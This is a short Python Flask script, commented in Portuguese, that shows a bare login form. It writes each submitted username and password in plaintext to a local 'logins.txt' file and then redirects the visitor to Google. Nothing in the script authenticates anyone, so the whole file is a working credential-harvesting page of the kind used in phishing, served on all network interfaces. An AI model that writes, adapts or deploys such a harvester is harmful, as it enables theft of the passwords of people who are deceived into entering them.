from flask import Flask, request, redirect

app = Flask(__name__)

# Rota principal
@app.route('/')
def hello_world():
    return 'Hello, World!'

# Rota de login com formulário
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Coleta os dados do formulário
        username = request.form['username']
        password = request.form['password']
        
        # Salva as informações em um arquivo 'logins.txt'
        with open('logins.txt', 'a') as file:
            file.write(f'Usuário: {username} - Senha: {password}\n')
        
        # Redireciona para o Google
        return redirect('https://www.google.com', code=302)
    
    # Exibe o formulário de login
    return '''
        <form method="post">
            Usuário: <input type="text" name="username"><br>
            Senha: <input type="password" name="password"><br>
            <input type="submit" value="Enviar">
        </form>
    '''

# Iniciar o servidor
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
